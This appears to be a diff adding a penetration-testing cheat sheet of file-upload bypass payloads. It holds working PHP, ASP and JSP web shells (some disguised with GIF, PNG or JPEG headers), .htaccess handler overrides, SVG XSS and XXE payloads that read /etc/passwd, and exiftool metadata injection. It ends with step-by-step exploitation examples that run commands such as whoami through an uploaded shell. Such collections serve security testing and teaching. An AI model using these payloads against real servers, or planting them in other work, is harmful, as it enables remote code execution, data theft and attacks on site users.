@@ -1,0 +1,331 @@
+# File Upload Bypass Payloads
+
+## ========================================
+## EXTENSION BYPASS
+## ========================================
+
+# Double extensions
+shell.php.jpg
+malware.asp.png
+backdoor.jsp.gif
+
+# Null byte injection
+shell.php%00.jpg
+malware.asp%00.png
+backdoor.jsp\x00.gif
+
+# Special characters
+shell.php....
+malware.asp;.jpg
+backdoor.jsp:.png
+
+# Case manipulation
+shell.PhP
+malware.AsP
+backdoor.JsP
+
+## ========================================
+## CONTENT-TYPE BYPASS
+## ========================================
+
+# Valid image content-type with PHP
+Content-Type: image/jpeg
+[PHP code in file]
+
+# Multiple content-types
+Content-Type: image/png
+Content-Type: application/x-php
+
+# Fake content-type
+Content-Type: image/gif
+[Actual file is .php]
+
+## ========================================
+## MAGIC BYTES (FILE SIGNATURE)
+## ========================================
+
+# PHP with GIF header
+GIF89a<?php system($_GET['cmd']); ?>
+
+# PHP with PNG header
+\x89PNG\r\n\x1a\n<?php system($_GET['cmd']); ?>
+
+# PHP with JPEG header
+\xFF\xD8\xFF\xE0<?php system($_GET['cmd']); ?>
+
+# PHP with PDF header
+%PDF-1.4\n<?php system($_GET['cmd']); ?>
+
+## ========================================
+## FILENAME MANIPULATION
+## ========================================
+
+# Unicode characters
+shell.php\u202E.jpg (Right-to-Left Override)
+
+# Long filename
+aaaa[...1000 chars...]aaaa.jpg.php
+
+# Directory traversal
+../../../shell.php
+..\..\..\..\shell.php
+
+# Relative paths
+./uploads/../shell.php
+
+## ========================================
+## POLYGLOT FILES
+## ========================================
+
+# GIFAR (GIF + JAR)
+GIF header + JAR content
+
+# PHP + JPEG
+Valid JPEG with PHP code in comment section
+
+# PDF + JavaScript
+PDF with embedded JavaScript
+
+## ========================================
+## MIME TYPE BYPASS
+## ========================================
+
+# Allow-list bypass
+shell.php.jpg with MIME image/jpeg
+
+# Extension whitelist bypass
+shell.phtml (if .php blocked)
+shell.php5
+shell.php7
+shell.phar
+
+## ========================================
+## ALTERNATE EXTENSIONS
+## ========================================
+
+# PHP
+.php, .php3, .php4, .php5, .php7, .phtml, .phar
+.phps, .phpt, .pgif, .phtm
+
+# ASP
+.asp, .aspx, .cer, .asa, .asax, .ascx, .ashx, .asmx, .axd
+
+# JSP
+.jsp, .jspx, .jsw, .jsv, .jspf
+
+# Perl
+.pl, .pm, .cgi, .lib
+
+# Python
+.py, .pyc, .pyo, .pyw
+
+# Coldfusion
+.cfm, .cfml, .cfc, .dbm
+
+## ========================================
+## WEB SHELL PAYLOADS
+## ========================================
+
+# Minimal PHP shell
+<?php system($_GET['cmd']); ?>
+
+# Minimal ASP shell
+<%eval request("cmd")%>
+
+# Minimal JSP shell
+<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
+
+# PHP web shell with GIF header
+GIF89a
+<?php
+if(isset($_REQUEST['cmd'])){
+    system($_REQUEST['cmd']);
+}
+?>
+
+## ========================================
+## HTACCESS UPLOAD
+## ========================================
+
+# Upload .htaccess to enable PHP
+AddType application/x-httpd-php .jpg
+AddType application/x-httpd-php .png
+AddType application/x-httpd-php .gif
+
+# Make all files executable
+SetHandler application/x-httpd-php
+
+## ========================================
+## SVG FILE UPLOAD XSS
+## ========================================
+
+# SVG with XSS
+<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)">
+
+# SVG with embedded script
+<?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+<svg version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <script type="text/javascript">
+    alert(document.domain);
+  </script>
+</svg>
+
+## ========================================
+## XXE VIA FILE UPLOAD
+## ========================================
+
+# SVG with XXE
+<?xml version="1.0" standalone="yes"?>
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd" > ]>
+<svg width="500" height="500" xmlns="http://www.w3.org/2000/svg">
+  <text x="0" y="20">&xxe;</text>
+</svg>
+
+# XML file with XXE
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [
+  <!ELEMENT foo ANY >
+  <!ENTITY xxe SYSTEM "file:///etc/passwd" >
+]>
+<foo>&xxe;</foo>
+
+## ========================================
+## ZIP UPLOAD EXPLOITATION
+## ========================================
+
+# Zip slip vulnerability
+Create zip with: ../../../../shell.php
+
+# Malicious archive
+Zip file containing web shell
+
+## ========================================
+## OFFICE DOCUMENT UPLOAD
+## ========================================
+
+# Macro-enabled documents
+.docm, .xlsm, .pptm
+
+# OLE objects
+Embedded executables
+
+## ========================================
+## BYPASSING FILE SIZE RESTRICTIONS
+## ========================================
+
+# Compress files
+Use gzip or zip compression
+
+# Stream upload
+Break into smaller chunks
+
+## ========================================
+## PATH TRAVERSAL IN UPLOAD
+## ========================================
+
+# Traverse to web root
+filename: ../../../var/www/html/shell.php
+
+# Windows path traversal
+filename: ..\..\..\..\shell.php
+
+## ========================================
+## IMAGE UPLOAD EXPLOITATION
+## ========================================
+
+# Metadata injection
+exiftool -Comment='<?php system($_GET['cmd']); ?>' image.jpg
+
+# Image with embedded PHP
+Valid image + PHP code appended
+
+## ========================================
+## CONTENT SNIFFING ABUSE
+## ========================================
+
+# Upload HTML as image
+<html><body><script>alert(1)</script></body></html>
+Saved as: xss.jpg
+
+## ========================================
+## RACE CONDITION
+## ========================================
+
+# Upload and execute before validation
+1. Upload shell.php
+2. Quickly access before deletion
+3. Create persistent backdoor
+
+## ========================================
+## EICAR TEST FILE
+## ========================================
+
+# Anti-virus test
+X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
+
+## ========================================
+## TESTING CHECKLIST
+## ========================================
+
+# 1. Extension bypass
+- Double extensions
+- Null bytes
+- Case manipulation
+
+# 2. Content-Type bypass
+- Fake MIME types
+- Mixed headers
+
+# 3. Magic bytes
+- Add file signatures
+- Polyglot files
+
+# 4. Path traversal
+- Directory traversal
+- Relative paths
+
+# 5. File size
+- Oversized files
+- Zero-byte files
+
+# 6. Special files
+- .htaccess
+- web.config
+- .user.ini
+
+## ========================================
+## TOOLS
+## ========================================
+
+# Burp Suite
+- Intercept upload request
+- Modify filename/content-type
+- Test various bypasses
+
+# exiftool
+exiftool -Comment='<?php echo "Shell"; ?>' image.jpg
+
+# Upload Scanner (Burp extension)
+- Automated upload bypass testing
+
+## ========================================
+## EXPLOITATION EXAMPLES
+## ========================================
+
+# Example 1: PHP upload
+1. Create: shell.php.jpg
+2. Content: GIF89a<?php system($_GET['c']); ?>
+3. Upload file
+4. Access: /uploads/shell.php.jpg?c=whoami
+
+# Example 2: SVG XSS
+1. Create: xss.svg
+2. Content: <svg onload="alert(1)">
+3. Upload and access
+4. XSS executes
+
+# Example 3: .htaccess upload
+1. Upload .htaccess with: AddType application/x-httpd-php .jpg
+2. Upload shell.jpg with PHP code
+3. Access shell.jpg - PHP executes
